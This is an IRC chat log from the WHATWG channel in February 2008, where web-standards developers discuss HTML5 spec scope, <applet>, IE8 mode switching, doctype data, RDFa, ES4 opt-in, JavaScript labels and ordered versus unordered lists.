[16:28:02.0000] <SadEagle>
well, who would document it, and why?

[16:32:00.0000] <jgraham>
I think there is plenty of evidence of valuable stuff that is not getting done e.g. the XUL-like box model in CSS which, AFAIK, has a stagnant spec

[16:33:00.0000] <SadEagle>
Spec writing is hard.. And DOM0 also requires reverse-engineering

[16:33:01.0000] <annevk>
I agree, so I wonder why he states that valuable stuff will get specified somehow where there's plenty of evidence to the contrary

[16:35:00.0000] <jgraham>
/me wonders if it's worthwhile to reply

[16:37:00.0000] <SadEagle>
plus, there is a big difference between spec existing and it being sufficiently precise to help creation of interoperable implementations.

[18:13:00.0000] <sayrer>
annevk, just saying that the really valuable stuff will get done

[18:13:01.0000] <sayrer>
annevk, lots of standards organizations think they are doing valuable work

[18:14:00.0000] <sayrer>
the WHATWG should not pretend it is immune to this hazard

[18:17:00.0000] <sayrer>
I should rephrase. I meant lots of standards organizations think everything they do is valuable.

[18:18:00.0000] <sayrer>
I certainly think some WHATWG work is valuable and high quality

[18:18:01.0000] <sayrer>
and I am not against all new features. just the ones that are big and distracting, or superfluous

[18:19:00.0000] <sayrer>
it doesn't seem like the WHATWG has a good way to propose cutting things, which is worrying

[19:19:00.0000] <Hixie>
sayrer is gone, but for what it's worth, the way to get rid of things is twofold

[19:19:01.0000] <Hixie>
one way is to just ask for it to be removed. We've dropped quite a lot of stuff that way.

[19:19:02.0000] <Hixie>
Another way is that when the spec reaches near-zero major feedback, i do a run through and cut stuff out. we did this with wf2, for instance, and cut a bunch of crap out.

[19:20:00.0000] <Hixie>
and another way, of course, is if no browsers implement it, it drops pretty much automatically..

[19:21:00.0000] <Hixie>
it should be noted that i recently proposed getting rid of <event-source>, and people screamed (with good arguments to back up their screams)

[19:21:01.0000] <Hixie>
i am also planning on dropping the <dfn> cross-ref crap

[19:21:02.0000] <Hixie>
no-one has screamed about that :-)

[19:21:03.0000] <Hixie>
teh data templates and repetition blocks stuff is going to go out too

[19:22:00.0000] <Hixie>
(those three areas are marked up in the spec as being considered for removal)

[19:31:00.0000] <csarven>
Hixie Is <dfn> even necessary?

[19:32:00.0000] <Hixie>
the element, or the cross-ref feature of it?

[19:33:00.0000] <csarven>
The element. If the cross-ref exists I can see some use for it (even though it is a little redundant).

[19:34:00.0000] <Hixie>
the element is used correctly by many people. the spec itself uses it a lot.

[19:35:00.0000] <csarven>
Don't most of those cases contain <abbr> within?

[19:37:00.0000] <Hixie>
no

[19:37:01.0000] <Hixie>
i don't know that <abbr> is used at all in the spec, in fact

[19:39:00.0000] <csarven>
Okay, I see how the spec makes a pretty good use of it.

[20:54:00.0000] <Hixie>
heh, he closed comments on his blog

[20:54:01.0000] <Hixie>
http://blog.mozilla.com/rob-sayre/2008/02/21/thoughts-on-whatwg/#comment-7671

[21:18:00.0000] <csarven>
Hixie I agree with your "Progress on the Web is a higher priority than spec size idealism."

[21:21:00.0000] <csarven>
Is there supposed to be a due date and max size for the spec? Heh. Better do it properly and cover what needs to be covered for today instead of releasing a recommendation every few years or something.

[23:21:00.0000] <sayrer>
Hixie, the issue is closed, right?

[23:21:01.0000] <sayrer>
I mean, you sounded like you closed it

[00:43:00.0000] <Hixie>
like i said in #mozilla, i wasn't trying to close the issue, i was just saying i don't know what you want us to do

[00:43:01.0000] <Hixie>
or #developers, or wherever it was

[00:45:00.0000] <Hixie>
i'd encourage you to send e-mail to the whatwg list with concrete things i can do to fix the issues you're seeing

[00:59:00.0000] <Hixie>
/me notices that on the list of things sayrer wanted removed includes a number of DOM Level 0 things, despite the fact that he later said he wanted us to focus only on DOM Level 0

[01:14:00.0000] <jruderman__>
what does "DOM Level 0" mean to you?

[03:48:00.0000] <annevk>
plenty of spam on the forums again

[09:03:00.0000] <zcorpan>
annevk: spam removed, please let me know if i missed something

[09:04:00.0000] <annevk>
looks fine

[12:02:00.0000] <Hixie>
jruderman__: well, things like window.alert(), for one... and setTimeout...

[12:03:00.0000] <annevk>
window in general...

[12:05:00.0000] <Hixie>
yeah but rsayrer specifically said he wanted to drop window.alert() and window.setTimeout() despite them being on his list of things to keep

[12:06:00.0000] <jwalden>
/me <3 public IRC logs

[14:40:00.0000] <gsnedders>
/me wonders why on earth Prince is inserting a pagebreak where page-break-after: avoid; and doing so wouldn't stop any other page-break from being satisfied


2008-02-24
[17:14:00.0000] <Philip`>
If I view http://pdsimg.jpl.nasa.gov/data/vl1_vl2-m-lcs-2-edr-v1.0/vl_0001/a0xx/11a021.blu in Opera (9.2 and 9.5, on Linux) it shows random (changing on refresh) stuff near the bottom after the text, sometimes containing filenames and contents of other tabs and things - does anyone else see the same issue?

[01:17:00.0000] <takkaria>
Hixie: that game warps your idea of space, nice

[03:03:00.0000] <annevk>
http://www.flickr.com/photos/21918446@N03/2286673874/

[03:03:01.0000] <annevk>
/me doesn't get the reference

[03:09:00.0000] <hsivonen>
I don't, either.

[05:56:00.0000] <hsivonen>
Hixie: looks like new development is still happening around Java applets: http://gemal.dk/blog/2008/02/24/mozilla_3_get_a_new_java_plugin/

[10:41:00.0000] <webben_>
Well, it's hardly like Java applets have disappeared over the new developments map.

[10:41:01.0000] <webben_>
e.g. Cortado video player

[10:46:00.0000] <hsivonen>
webben_: the point I'm trying to make is that HTML5 should have <applet>

[10:48:00.0000] <webben_>
hsivonen: I don't particularly disagree with that (makes as much sense as keeping embed for Flash at any rate), but I think the argument you'd need to make (at least as far as Hixie is concerned) is that you couldn't use OBJECT for that.

[10:49:00.0000] <webben_>
the point is less are Java applets still used than do they need APPLET.

[10:52:00.0000] <hsivonen>
webben_: good point

[10:54:00.0000] <webben_>
(FWIW, data point of one and all that, I had a lot of trouble trying to migrate some legacy content from APPLET to OBJECT, it appeared to work but actually seemed to result to flakiness. That doesn't mean it was necessarily impossible, but it wasn't obvious how to fix it.)

[11:03:00.0000] <hsivonen>
webben_: I sent email to the HTML WG

[11:04:00.0000] <webben_>
cool

[11:07:00.0000] <hsivonen>
hmm. I forgot to refer to http://lists.whatwg.org/htdig.cgi/whatwg-whatwg.org/2007-April/010789.html in my message

[11:08:00.0000] <webben_>
"including how fallback content works when java support isn't present and the alt attribute is present. (As in, does alt get used over fallback content or the other way around or somewhere in between." from the message is important. IIRC browsers seem to handle that very differently.

[11:09:00.0000] <webben_>
of course, that could be specified in the compatibility section without including it in the recommended-to-authors core.

[11:22:00.0000] <gsnedders>
jgraham_: my only plan for May outwith of school is to go to my grandmother's memorial service (in Cam)

[11:23:00.0000] <gsnedders>
jgraham_: so I really don't have many plans either :)

[11:24:00.0000] <jgraham_>
gsnedders: Yeah, I'll make sure to keep those dates free

[13:11:00.0000] <annevk>
we have some open bugs on fallback handling for <applet>

[13:11:01.0000] <annevk>
i think we decided on dropping alt= support in favor of fallback

[13:26:00.0000] <annevk>
http://mashable.com/2008/02/24/ie8-beta1-private/


2008-02-25
[00:15:00.0000] <hsivonen>
http://www.webstandards.org/2008/02/24/wasp-round-table-ie8s-default-version-targeting-behavior/

[00:27:00.0000] <roc>
when is MS going to explain exactly what the mode switch does? Sounds like it affects the DOM APIs but I haven't seen anything explicitly saying that

[00:33:00.0000] <hsivonen>
I don't like the way ALA and WaSP are the main PR channels for communicating about this.

[00:57:00.0000] <roc>
yeah

[00:57:01.0000] <roc>
they're obviously being told things under NDA

[01:36:00.0000] <Dashiva>
roc: Non-disagreement agreement? :P

[01:38:00.0000] <annevk>
man, where are all the tough questions in those transcripts

[01:38:01.0000] <annevk>
yay, we all agree, lets have beer

[01:42:00.0000] <jruderman>
Dashiva++

[02:59:00.0000] <hsivonen>
microformats have arrived. RDFa Syntax introduces itself by contrasting itself with microformats: http://www.w3.org/TR/2008/WD-rdfa-syntax-20080221/

[03:03:00.0000] <annevk>
makes sense i guess, lots of people heard of microformats

[03:05:00.0000] <hsivonen>
reminds me of http://en.wikipedia.org/wiki/Second-system_effect

[03:07:00.0000] <hsivonen>
of course, RDFa is fatally flawed because it doesn't work with HTML

[03:08:00.0000] <annevk>
it sort of does with simple dom traversal

[03:08:01.0000] <Philip`>
Bananas don't work with HTML either, but they still seem pretty popular, just in different problem domains :-)

[03:08:02.0000] <annevk>
it's just qnames in attribute values and magic xmlns attributes after all

[03:09:00.0000] <hsivonen>
annevk: true

[03:09:01.0000] <hsivonen>
still, it's sad that Creative Commons is advancing this complexity when they should endeavor to make things simple

[03:11:00.0000] <hsivonen>
I still don't know if http://intertwingly.net/blog/2008/02/09/Mashups-Smashups#c1202810109 was meant as a joke or as a serious question

[03:12:00.0000] <annevk>
prolly serious...

[03:12:01.0000] <annevk>
given the second sentence

[03:14:00.0000] <hsivonen>
btw, when Lessig uses CC-licensed photos off the Web in his presentations, he doesn't include the license URI...

[03:16:00.0000] <hsivonen>
hmm. it's 2008 and XHTML+RDFa document conformance deals with DTDs

[03:16:01.0000] <hsivonen>
sad

[03:20:00.0000] <mpt>
That appears to be an example of the "Appeal to the current year" logical fallacy :-)

[03:21:00.0000] <hsivonen>
mpt: true.

[03:23:00.0000] <annevk>
it's still sad

[03:23:01.0000] <annevk>
:p

[04:15:00.0000] <Philip`>
http://www.glendathegood.com/wasp/transcript.html - "The version vector plan right now, have the version vector [for conditional comments] and the UA string reflect the real version of IE8 and see what compatibility that turn out to be." - hmm, that would break things with "lte IE7" like http://lists.w3.org/Archives/Public/public-html/2008Jan/0189.html

[04:16:00.0000] <annevk>
in effect they still require pages to update sniffing, etc.

[04:17:00.0000] <Philip`>
Only pages which currently do sniffing, which is a subset of the pages that depend on IE6/7 bugs/features

[04:18:00.0000] <Camaban>
there's a suggestion there to make strict doctypes trigger 'ie8 mode' isn't there?

[04:18:01.0000] <Camaban>
(near the end)

[04:19:00.0000] <Philip`>
There was, but they didn't have any data about how common that was in practice

[04:20:00.0000] <Camaban>
yeah, a suggestion to look into more, rather than a "lets do it" suggestion

[04:20:01.0000] <Philip`>
(http://philip.html5.org/data/doctypes-lc.txt has data)

[04:21:00.0000] <annevk>
it's not clear how large the data set is and how many sites did not have a doctype

[04:22:00.0000] <Philip`>
annevk: It has a non-hyper link to a version with more detail

[04:22:01.0000] <Philip`>
It doesn't say how many don't have a doctype, since I didn't measure that, but I'll say it's 50% based on other data from the same source

[04:23:00.0000] <Camaban>
so a few hundred strict, standards mode triggering doctypes, compared to 6000 or so transitional, standards and quirks

[04:23:01.0000] <Camaban>
at a quick glance

[04:43:00.0000] <Philip`>
Would <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"> be valid? (I don't see anybody using it without the SYSTEM URI)

[04:47:00.0000] <hsivonen>
Philip`: no

[04:48:00.0000] <hsivonen>
XML requires a system id

[04:48:01.0000] <Philip`>
Okay, thanks

[05:16:00.0000] <zcorpan_>
Philip`: do those doctypes get the same mode using the html5 algorithm? or rather, do you know (or can easily find out) which don't?

[05:17:00.0000] <zcorpan_>
just glancing i see html 4.0 transitional with SI

[05:18:00.0000] <zcorpan_>
<!doctype html public "-//"aol hometown//html 3.0 transitional//en">

[05:18:01.0000] <Philip`>
zcorpan_: They won't all be the same, but I haven't tried to work out which ones will differ

[05:19:00.0000] <zcorpan_>
<!doctype htm public "-//w3c//dtd htm 4.0 transitional//en">

[05:19:01.0000] <zcorpan_>
1 - <!doctype html public "-//"aol hometown//html 3.0 transitional//de">

[05:19:02.0000] <zcorpan_>
1 - <!doctype html public "-//"aol hometown//html 3.0 transitional//fr">

[05:19:03.0000] <Philip`>
<!doctype html public "-//w3c//dtd xhtml 1.0 strict//en" "http://www.w3.org/tr/xhtml2/dtd/xhtml1-strict.dtd">

[05:20:00.0000] <zcorpan_>
that one would get standards mode per html5 too, right?

[05:21:00.0000] <zcorpan_>
i wonder if the "2" was a typo or deliberate

[05:22:00.0000] <Philip`>
I believe that'd be HTML5 standards

[05:22:01.0000] <zcorpan_>
<!doctype html public "-//ietf//dtd html strict level 2//en">

[05:22:02.0000] <Philip`>
Perhaps the most significant difference is that IE treats ill-formed doctypes as standards, whereas HTML5 treats them as quirks

[05:22:03.0000] <Philip`>
(like in that AOL Hometown case)

[05:24:00.0000] <Philip`>
or maybe the most significant difference is that IE treats many typoed doctypes as quirks (if they still contain a blacklisted substring), whereas HTML5 treats them as standards

[05:27:00.0000] <zcorpan_>
yes, i think changing the last two characters to the locale of the page is not that uncommon

[05:48:00.0000] <Philip`>
/me tries doing a comparison against HTML5

[07:00:00.0000] <Philip`>
/me wonders why Safari doesn't do compatMode

[08:03:00.0000] <Philip`>
Hmm, looks like someone deleted cnn.com from dmoz.org

[08:04:00.0000] <Philip`>
There used to be 223658 of it, but now there's only 3156

[08:05:00.0000] <Philip`>
There's 4552771 URIs spread over 2982776 domains, and the top domain is www.geocities.com with 80118

[08:14:00.0000] <Philip`>
(Top 1% of domains have 24% of URIs; top 10% have 36%)

[08:17:00.0000] <Philip`>
(I do like how I can do "sort -R four-point-five-million-line-text-file" and not need to even begin to worry about how much RAM it's using)

[10:11:00.0000] <annevk>
peoples: http://www.w3.org/TR/cssom-view/ & http://www.w3.org/TR/XMLHttpRequest2/

[10:14:00.0000] <aroben>
annevk: neat

[10:16:00.0000] <aroben>
annevk: how many specs are you editing now?

[10:18:00.0000] <annevk>
apart from informal HTML drafts 5 I think (plus Selectors API which Lachlan is editing now)

[10:18:01.0000] <Dashiva>
He's probably aiming for 5 > 2 :)

[10:18:02.0000] <annevk>
heh

[10:18:03.0000] <annevk>
the CSSOM stuff isn't getting enough attention though as it requires a lot of research I haven't found time for

[11:18:00.0000] <Hixie>
annevk: pity someone edited the spec for you

[11:29:00.0000] <Hixie>
holy crap

[11:29:01.0000] <Hixie>
RDFa has gotten BIGGER since i last looked

[11:29:02.0000] <Hixie>
talk about serious second-system effect

[11:29:03.0000] <Hixie>
jesus

[11:33:00.0000] <takkaria>
I thought rdfa was meant to be small and compact

[11:34:00.0000] <Hixie>
i still don't understand how RDFa is supposed to interact with, e.g., <title>

[11:35:00.0000] <Hixie>
if an RDFa bit says the document title is X, and <title> says the document title is Y, then... what?

[11:35:01.0000] <SadEagle>
/me keeps Hixie away from ES4 :-)

[11:36:00.0000] <Hixie>
ES4 has one gigantic problem right now

[11:36:01.0000] <Hixie>
and it's not clear to me anyone on the ES4 group is striving to fix it

[11:36:02.0000] <Hixie>
but since the RI is the only spec, it's not clear to me how to proceed

[11:36:03.0000] <SadEagle>
do you mean the lack of spec, or the hyper second-system syndrome?

[11:36:04.0000] <Hixie>
neither

[11:37:00.0000] <Hixie>
ES4 scripts have to explicitly opt-in to being processed as ES4 instead of ES3, but the opt-in can only be out-of-band (e.g. in <script type=""> attributes) which doesn't work for a whole series of use cases

[11:38:00.0000] <Hixie>
e.g. it doesn't work as a way to upgrade existing deployed <script> blocks doing third-party includes, it doesn't work for HTML event handler attributes, it doesn't work when you don't know what type your script will be, etc

[11:38:01.0000] <Hixie>
it also means you need separate scripts for ES4 and ES3

[11:39:00.0000] <Hixie>
this is unlike, e.g., HTML and CSS, both of which have backwards-compatible mechanisms

[11:40:00.0000] <SadEagle>
the language has a lot of complexity to be backwards compatible when ES3 is handled as ES4, though. 

[11:40:01.0000] <SadEagle>
Partly for migration, of course

[11:41:00.0000] <SadEagle>
One can do this sort of thing in-band, though, but it'll be ugly.

[11:42:00.0000] <Hixie>
ugly is better than fatally flawed :-)

[11:43:00.0000] <SadEagle>
things like cross-interpreter calls would be a total mess, though.

[11:43:01.0000] <hsivonen>
is there a reason for not going all the way so that a browser could run all ES3 scripts as ES4 scripts?

[11:43:02.0000] <Hixie>
so have one interpreter

[11:43:03.0000] <Philip`>
When JavaScript reserved all the Java keywords, was that intended for future extensibility, or was it just for compatibility between Java and JS (so you wouldn't accidentally make variables you couldn't talk about in the other language) or something else?

[11:44:00.0000] <Hixie>
Philip`: everyone ignored that requirement, so it's moot, sadly

[11:44:01.0000] <hsivonen>
/me notes that v.nu doesn't ignore the reserved word list

[11:45:00.0000] <SadEagle>
it's actually not entirely ignored, but semi-weird

[11:45:01.0000] <hsivonen>
(in callback name checking)

[11:47:00.0000] <Philip`>
On the subject of JS, what syntax feature allows <a onclick="javascript: alert('hello')"> (and equivalently <a onclick="vbscript: alert('hello')"> etc)?

[11:51:00.0000] <annevk>
Hixie, if you mean the HTML5 reference, it's still part of XMLHttpRequest Level 2... guess Bert removed it from the CSSOM View Module or something

[11:51:01.0000] <Hixie>
man, i'd be pissed if someone did that to my spec

[11:52:00.0000] <Hixie>
Philip`: goto labels, no?

[11:52:01.0000] <annevk>
I don't feel too strongly about references at this point

[11:52:02.0000] <SadEagle>
heh, good point Hixie

[11:53:00.0000] <Hixie>
annevk: for me it's not about references, it's about someone changing something i'd have explicitly done

[11:53:01.0000] <Hixie>
but anyway

[11:54:00.0000] <Philip`>
Hixie: JS doesn't have goto

[11:54:01.0000] <Hixie>
oh

[11:54:02.0000] <Philip`>
so goto labels don't seem an entirely sensible thing to have

[11:54:03.0000] <Hixie>
well

[11:54:04.0000] <Hixie>
i seem to recall there was some sort of label thing

[11:54:05.0000] <Philip`>
Then again, it does have the goto reserved word despite not having goto

[11:55:00.0000] <Philip`>
so it's not an entirely sensible language

[11:55:01.0000] <annevk>
Hixie, true

[11:56:00.0000] <SadEagle>
Philip`: they're not goto labels, they're breka/continue labels.

[11:58:00.0000] <Philip`>
SadEagle: Oh, I didn't know JS had that

[11:58:01.0000] <Philip`>
(but some testing indicates that it does)

[11:59:00.0000] <SadEagle>
you can actually break a non-loop, too.

[11:59:01.0000] <SadEagle>
(with a labeled break, that is)

[12:00:00.0000] <Philip`>
By "non-loop", do you mean something like "javascript: { break javascript; }"?

[12:00:01.0000] <SadEagle>
yep.

[12:01:00.0000] <Philip`>
/me wonders why he had never noticed this feature

[12:01:01.0000] <Philip`>
(I knew Java did that, but not JS)

[12:03:00.0000] <hsivonen>
does java have non-loop break labels?

[12:05:00.0000] <hsivonen>
whoa! it indeed does.

[12:05:01.0000] <Philip`>
hsivonen: Eclipse doesn't give squiggly lines when I try that, so I guess so

[12:05:02.0000] <hsivonen>
I learned something new

[12:05:03.0000] <hsivonen>
thanks

[14:27:00.0000] <jruderman>
the phone meeting about cross-site xmlhttprequest in firefox is starting soon

[14:41:00.0000] <annevk>
Hixie, the <title> argument is bogus

[14:41:01.0000] <annevk>
Hixie, the spec should not be moving <title> around

[14:41:02.0000] <Hixie>
hm?

[14:41:03.0000] <Hixie>
even if it shouldn't, <title> is always gonna be PCDATA

[14:41:04.0000] <Hixie>
or CDATA

[14:41:05.0000] <annevk>
true

[14:41:06.0000] <Hixie>
or whatever its parse mode is called

[14:44:00.0000] <annevk>
also, what's the case where Opera does better than void?

[14:45:00.0000] <annevk>
i'm also curious what the use case is for a form control in a header/title

[14:45:01.0000] <Hixie>
templates

[14:47:00.0000] <annevk>
hmm, i don't quite get templates either :)

[14:48:00.0000] <Hixie>
opera seems to do better at least in the case where a <fieldset> is involved

[14:48:01.0000] <Hixie>
and re your second case, imagine

[14:49:00.0000] <annevk>
oh, with fieldset... hmm, but that's not the common case as you indicate 

[14:49:01.0000] <Hixie>
<figure> <textarea name="poem"> </textarea> <legend> <input name="author">, <input type=number name="year"> </legend> </figure>

[14:49:02.0000] <annevk>
not that it matters much either way

[14:49:03.0000] <Hixie>
yeah

[14:49:04.0000] <Hixie>
i didn't mean to say opera was fine :-)

[14:50:00.0000] <Lachy>
Hixie, you wrote in the figure email: "<label> unfortunately would preclude putting more than one form control in a legend, which would be a weird restriction." - did you mean "control in a *figure*"?

[14:51:00.0000] <Hixie>
i meant in the legend of the figure

[14:51:01.0000] <Hixie>
as per my example above

[14:53:00.0000] <Lachy>
oh, ok. I should have read the IRC log before posting.

[14:53:01.0000] <Hixie>
heh

[14:55:00.0000] <jgraham_>
/me still believes that making language features dependent on all major browsers changing their parsing in a largely untested way is not the greatest idea.

[14:56:00.0000] <jgraham_>
But I've said that before and I don't have any new arguments or anything

[14:57:00.0000] <annevk>
we can always revise our evil plans for world domination in two years

[14:57:01.0000] <Lachy>
jgraham_, we can always revisit the issue again if browsers come back after trying it and say it causes too many provlems

[15:01:00.0000] <gsnedders>
jgraham_: I'm currently leaving towards having supper together on Fri, FWIW

[15:11:00.0000] <Hixie>
jgraham_: i agree

[15:15:00.0000] <mpt>
/me wonders whether there should be an element for captions of form elements

[15:16:00.0000] <mpt>
If someone tabs to an input field, the browser automatically scrolls to show as much of the field as possible, but doesn't scroll to show that field's caption, because it doesn't know what a caption is

[15:18:00.0000] <mpt>
If there was a caption element that was tied to the input element, the browser would know to scroll to show it

[15:18:01.0000] <Hixie>
isn't that <label>?

[15:18:02.0000] <mpt>
no

[15:19:00.0000] <mpt>
<label> appears above or (in LTR scripts) to the left of an element

[15:19:01.0000] <mpt>
the caption appears underneath, and is usually in smaller print

[15:19:02.0000] <Hixie>
can you show me a page with the difference you are indicating?

[15:20:00.0000] <mpt>
<https://launchpad.net/projects/+new>, but it requires a Launchpad account

[15:21:00.0000] <mpt>
/me looks for another

[15:22:00.0000] <Hixie>
annevk: would be cool if one could bookmark the settings on http://html5.org/tools/web-apps-tracker

[15:22:01.0000] <Hixie>
would also be cool to have an atom feed or something for that

[15:23:00.0000] <Hixie>
and finally, it would also be cool to adda Google Gears icon to the list of vendors, maybe with the letter 'r' as the way for me to trigger it

[15:23:01.0000] <annevk>
is anyone actually using that interface?

[15:23:02.0000] <Hixie>
they have apparently asked if they can be added since they are about to start doing more html5-y stuff

[15:23:03.0000] <Hixie>
i dunno if anyone else is, but i certainly use it

[15:23:04.0000] <annevk>
i guess i'm not representative

[15:24:00.0000] <Hixie>
from #webkit:

[15:24:01.0000] <Hixie>
00:28 <        aroben> Hixie: I find the tracker very handy, though

[15:24:02.0000] <Hixie>
(referring to the page)

[15:24:03.0000] <annevk>
sorry, i'm using the tracker *a lot*

[15:24:04.0000] <annevk>
i meant the UA-specific crap

[15:24:05.0000] <annevk>
all those options

[15:24:06.0000] <annevk>
(the colors and icons in the changelog lines are useful though, to me)

[15:25:00.0000] <Hixie>
i like the options, i would probably use it more to point to other people if i could bookmark them though

[15:25:01.0000] <Hixie>
if you want an icon for gears, there's one at http://google-gears.googlecode.com/svn/trunk/gears/ui/common/icon_16x16.png

[15:27:00.0000] <mpt>
Hixie, in <http://login.live.com/login.srf?wa=wsignin1.0&rpsnv=10&ct=1203982238&rver=4.5.2130.0&wp=MBI&wreply=http:%2F%2Fmail.live.com%2Fdefault.aspx&id=64855> both the text fields have a label and a caption

[15:27:01.0000] <mpt>
(though in that page the scrolling isn't important, because you can probably see both without scrolling already)

[15:27:02.0000] <Hixie>
i disagree with calling that a caption

[15:27:03.0000] <Hixie>
but i agree they are related to the field

[15:27:04.0000] <Hixie>
and are not labels

[15:28:00.0000] <Hixie>
they're like the (?) part of the checkbox labels

[15:28:01.0000] <Hixie>
interesting cases

[15:28:02.0000] <mpt>
I don't know what to call them other than captions

[15:29:00.0000] <mpt>
<https://www.google.com/accounts/NewAccount?service=mail&continue=http%3A%2F%2Fmail.google.com%2Fmail%2Fe-11-10b567b3542c73d051854a3694480bd-27a8b709838b6e5bc593de69344785f3ae19edf1&type=2> has examples too

[15:30:00.0000] <Hixie>
yeah it's a common idionm

[15:30:01.0000] <Hixie>
idiom

[15:30:02.0000] <Hixie>
most are basically help strings

[15:30:03.0000] <mpt>
Tab to the "Secondary email" field, and you won't see its caption, because the browser doesn't know any better.

[15:30:04.0000] <Hixie>
in fact i think all of these are really help strings

[15:31:00.0000] <Hixie>
might make sense to have a <label> ... <input> <help>...</help> </label> or <label for="">...</label> <input id=""> <help for="">...</help> construct

[15:33:00.0000] <mpt>
But then, see that Gmail has "Learn More" links

[15:33:01.0000] <mpt>
*That* is help

[15:34:00.0000] <Hixie>
sure, you can have inline short help and external longer help

[15:34:01.0000] <Hixie>
i've noted this for wf3.

[15:34:02.0000] <mpt>
Right, it's a continuum

[15:34:03.0000] <mpt>
thanks

[15:34:04.0000] <Hixie>
thank _you_!

[15:35:00.0000] <annevk>
man, web-apps-tracker is a hack

[15:35:01.0000] <annevk>
i've to add google-gears to like five different places

[15:35:02.0000] <annevk>
scary

[15:35:03.0000] <Hixie>
hehe

[15:35:04.0000] <Hixie>
feel free to make a new one that's better :-)

[15:36:00.0000] <Hixie>
afk. i really do have to actually go to work... or i'll starve.

[15:45:00.0000] <annevk>
ok, four different places

[15:45:01.0000] <annevk>
gears is now supported, all the fancy features will have to wait

[15:48:00.0000] <annevk>
Hixie, "r" triggers Google Gears as I couldn't think of something better either

[15:50:00.0000] <annevk>
/me -> bed


2008-02-26
[16:51:00.0000] <Hixie>
annevk: cool, thanks

[17:40:00.0000] <Hixie>
/me summons zcorpan

[17:41:00.0000] <Hixie>
anyone have an opinion on whether <ol> is appropriate for lists that happen to be ordered as opposed to lists where the order is significant?

[17:41:01.0000] <Hixie>
e.g. should a list of place names, ordered alphabetically, be <ol> or <ul>?

[17:42:00.0000] <tantek>
Hixie, example of each?

[17:42:01.0000] <tantek>
<ol> - since "alphabetically" could mean any number of a different canonical sorting orders given variations in language/culture/punctuation treatment.

[17:43:00.0000] <Hixie>
hm, interesting

[17:43:01.0000] <tantek>
no way to really automatically discern how such ordering was done if in a <ul> and thus if it has significance or not.

[17:43:02.0000] <Hixie>
you used the opposite argument to zcorpan in his feedback in 2006

[17:43:03.0000] <Hixie>
:-)

[17:43:04.0000] <tantek>
I've learned more about alphabetic sorting since then.

[17:44:00.0000] <Hixie>
no i mean he argued the opposite of you just now, in his mail from 2006

[17:44:01.0000] <Hixie>
he says:

[17:44:02.0000] <Hixie>
> I think <ol> is a list where the order is significant to the meaning;

[17:44:03.0000] <Hixie>
> where the order is emphasized. For lists that happen to be ordered but

[17:44:04.0000] <Hixie>
> the order isn't really of a big significance or isn't of higher

[17:44:05.0000] <Hixie>
> significance than the global order of the document, <ol> shouldn't be

[17:44:06.0000] <Hixie>
> used IMHO.

[17:44:07.0000] <Hixie>
> Otherwise people might use <ol> whenever a list happens to be in order, e.g.

[17:44:08.0000] <Hixie>
> an A-Z list...

[17:44:09.0000] <tantek>
One way to think about it is, if the author considers the ordering to be something they did deliberately (whether by hand in the markup), then the way to communicate "deliberate ordering" is by using an <ol>

[17:45:00.0000] <tantek>
(whether by hand in the markup, or by selection of some backend sorting option in a query)

[17:45:01.0000] <Hixie>
so <ul> elements must be in effectively random order?

[17:45:02.0000] <tantek>
not necessarily

[17:45:03.0000] <tantek>
randomness isn't necessary

[17:46:00.0000] <Hixie>
right, i mean effectively random, as opposed to necessarily truly random

[17:46:01.0000] <tantek>
If the author considers the order to be arbitrary (not necessarily random), or doesn't care about the order, then a <ul> makes sense.

[17:46:02.0000] <tantek>
<ol> = author cared about the order.  <ul> = author didn't care about the order.  That simple.  I think.

[17:46:03.0000] <Hixie>
i suppose a list of place names that were arbitrarily ordered alphabetically as opposed to ordered alphabetically for any particular reason would mean <ul> then

[17:48:00.0000] <tantek>
again, that assumes that a universal canonical alphabetic ordering exists that everyone implicitly understands, which is a false assumption.

[17:48:01.0000] <Hixie>
how do you mean?

[17:49:00.0000] <tantek>
alphabetic ordering is not just by characters per unicode code points for example

[17:50:00.0000] <Hixie>
sure. i mean, the ordering could be anything, i was just using "alphabetical" as an arbitrary ordering

[17:50:01.0000] <tantek>
e.g. depending on the context of the data, say it were English names of works of art (like movies or songs)

[17:51:00.0000] <Hixie>
for example the list could be in order of the population size per place, but if that was just an arbitrary order selected by the author simply for presentational reasons, that would be a <ul>

[17:51:01.0000] <tantek>
often a leading word "The" is omitted from the canonical sorting

[17:51:02.0000] <tantek>
there are numerous other such rules. and that's just for English.  names of works of art.

[17:51:03.0000] <tantek>
so there are language specific rules.  domain specific rules. etc.

[17:51:04.0000] <Hixie>
whereas if the list was a list of places, ordered by population size to show the differences in population sizes, <ol> would be correct

[17:52:00.0000] <tantek>
I think for whatever reason, if the author intends an order, then it should be marked up with <ol>

[17:52:01.0000] <tantek>
One thought experiment you could do is, if the browser scrambled the set of <li>s inside a <ul>, how upset would the author be when viewing the page?

[17:53:00.0000] <Hixie>
right

[17:53:01.0000] <tantek>
so a list of places, ordered by name (or population), that would be bad

[17:53:02.0000] <tantek>
but a grocery shopping list, not a problem

[17:53:03.0000] <Hixie>
so if i'm just listing places i've been, and i happen to have put them in order of population size, i don't care if the browser reorders them to be by order of how much rainfall they get per year

[17:54:00.0000] <tantek>
right, if the author didn't take care with the order, then a <ul> - hence my reasoning above

[17:54:01.0000] <tantek>
"for whatever reason, if the author intends an order, then it should be marked up with <ol>"

[17:54:02.0000] <tantek>
otherwise use <ul>

[17:54:03.0000] <Hixie>
but if i have a grocery list in order of importance, or in order of which aisle the stuff is found in, then i'd want <ol>

[17:54:04.0000] <Hixie>
well

[17:54:05.0000] <Hixie>
i'm saying the author might "intend an order" but not care about it at the same time

[17:54:06.0000] <tantek>
right, but I have yet to see such a grocery list ;)

[17:55:00.0000] <tantek>
then intend an order wins out

[17:55:01.0000] <tantek>
the intent is enough to justify an <ol>

[17:55:02.0000] <Hixie>
/me often puts grocery lists in order of importance, so that he can make sure to get the important stuff first, since he is limited by volume when cycling from the shop :-)

[17:55:03.0000] <Hixie>
hmm

[17:55:04.0000] <tantek>
the intent doesn't have to be "big" or "significant" - because who decides that?

[17:55:05.0000] <Hixie>
so zcorpan is saying that intent doesn't win out, but that care does

[17:56:00.0000] <Hixie>
i wonder which is more useful

[17:56:01.0000] <tantek>
given that authors are the ones writing the markup, I find that going with respecting/modeling author intent usually produces better results. ;)

[17:56:02.0000] <tantek>
rather than some academic argument about how "significant" the ordering is

[17:57:00.0000] <Hixie>
well, the default rendering of <ul> is bullets, and i'd want bullets if i gave a list of places i'd been to, even if i ordered them (arbitrarily) by population size or lexically or by rainfall

[17:57:01.0000] <Hixie>
so that would argue against what you're saying :-)

[17:57:02.0000] <tantek>
